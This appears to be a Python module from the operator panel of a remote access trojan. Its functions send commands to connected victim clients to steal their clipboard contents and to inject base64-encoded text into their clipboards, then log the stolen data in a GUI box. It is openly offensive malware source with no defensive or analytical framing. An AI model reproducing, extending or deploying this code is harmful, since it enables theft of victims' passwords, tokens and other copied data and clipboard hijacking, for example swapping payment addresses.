import base64
import datetime
from tcpmanager import send_to, get_log
from panel import logbox

def log_event(cid, msg):
    now = datetime.datetime.now().strftime("[%H:%M:%S]")
    logbox.insert("end", f"<CLIPBOARD {cid}> {msg}\n")
    logbox.see("end")

def steal_clipboard(cid):
    # Solicita client enviar clipboard atual
    send_to(cid, b"CLIPSTEAL:")
    log_event(cid, "Requisiçao clipboard steal.")

def inject_clipboard(cid, cliptext):
    # Envia texto para o client injetar no clipboard
    enc = base64.b64encode(cliptext.encode()).decode()
    send_to(cid, f"CLIPINJECT:{enc}".encode())
    log_event(cid, f"Inject clipboard: {cliptext}")

def handle_clipboard_response(cid, raw):
    try:
        if raw.startswith("CLIPDATA:"):
            b64 = raw[len("CLIPDATA:"):]
            clip = base64.b64decode(b64.encode()).decode(errors="ignore")
            log_event(cid, f"Clipboard steal: {clip}")
        elif raw.startswith("CLIPINJECT:OK"):
            log_event(cid, "Clipboard injected successfully.")
        elif raw.startswith("CLIPINJECT:ERR:"):
            log_event(cid, f"Clipboard inject error: {raw.split(':',2)[2]}")
        else:
            log_event(cid, f"Unknown clipboard response: {raw}")
    except Exception as e:
        log_event(cid, f"Clipboard handle error: {str(e)}")